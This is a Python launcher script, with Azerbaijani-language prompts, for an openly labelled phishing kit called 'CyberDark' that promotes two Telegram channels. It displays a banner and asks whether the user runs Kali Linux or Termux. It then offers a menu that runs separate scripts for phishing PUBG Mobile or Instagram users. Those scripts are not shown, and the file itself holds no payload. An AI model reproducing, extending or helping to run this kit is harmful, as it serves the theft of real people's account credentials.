import os
import signal
import sys
os.system("clear")
banner = """

\033[1;31m
   █████████             █████                        ██████████                       █████     
  ███░░░░░███           ░░███                        ░░███░░░░███                     ░░███      
 ███     ░░░  █████ ████ ░███████   ██████  ████████  ░███   ░░███  ██████   ████████  ░███ █████
░███         ░░███ ░███  ░███░░███ ███░░███░░███░░███ ░███    ░███ ░░░░░███ ░░███░░███ ░███░░███ 
░███          ░███ ░███  ░███ ░███░███████  ░███ ░░░  ░███    ░███  ███████  ░███ ░░░  ░██████░  
░░███     ███ ░███ ░███  ░███ ░███░███░░░   ░███      ░███    ███  ███░░███  ░███      ░███░░███ 
 ░░█████████  ░░███████  ████████ ░░██████  █████     ██████████  ░░████████ █████     ████ █████
  ░░░░░░░░░    ░░░░░███ ░░░░░░░░   ░░░░░░  ░░░░░     ░░░░░░░░░░    ░░░░░░░░ ░░░░░     ░░░░ ░░░░░ 
               ███ ░███                                                                          
              ░░██████                                                       <> Phising <>                 
              ░░░░░░           
                         \033[1;34m                  Version 0.2 
                               #######################################
                               #    <>Developer By m3m3nt9m9ri<>     #
                               #                                     #
                               #  <> Aşağıdakı telegram kanallarına  #
                               #            gözləyirik <>            #
                               #                                     #
                               ######################################
                                <>   https://t.me/cyberdarkk     <>
                                <>   https://t.me/istiklal_team  <>
            \n\n\n
            """
print(banner)
system = """
1.Kali Linux
2.Termux
"""
print(system)
secim = int(input("Sisteminizi seçin: "))
os.system("clear")
print(banner)
if secim == 1:

    def main_menu():
        print("\033[1;31m[1]. \033[32mPubg Mobile")
        print("\033[1;31m[2]. \033[32mİnstagram\n\n\n\n")
        choice = input("----| Seçim edin: ")
        return choice

    def run_first_code():
        os.system("sudo python3 Pmobile.py")
        os.system("clear")
        print(banner)

    def run_second_code():
        os.system("sudo python3 İnstagram.py")
        os.system("clear")
        print(banner)

    def signal_handler(sig, frame):
        print("\n\nTool dayandırıldı...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    if __name__ == '__main__':
        while True:
            choice = main_menu()

            if choice == '1':
                run_first_code()
            elif choice == '2':
                run_second_code()
            else:
                print("\n\n\n\033[1;31mDüzgün seçim edin 1 və ya 2\n\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n")
if secim == 2:
    def main_menu():
        print("\033[1;31m[1]. \033[32mPubg Mobile")
        print("\033[1;31m[2]. \033[32mİnstagram\n\n\n\n")
        choice = input("----| Seçim edin: ")
        return choice

    def run_first_code():
        os.system("python3 Pmobile.py")
        os.system("clear")
        print(banner)

    def run_second_code():
        os.system("python3 İnstagram.py")
        os.system("clear")
        print(banner)

    def signal_handler(sig, frame):
        print("\n\nTool dayandırıldı...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    if __name__ == '__main__':
        while True:
            choice = main_menu()

            if choice == '1':
                run_first_code()
            elif choice == '2':
                run_second_code()
            else:
                print("\n\n\n\033[1;31mDüzgün seçim edin 1 və ya 2\n\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n")

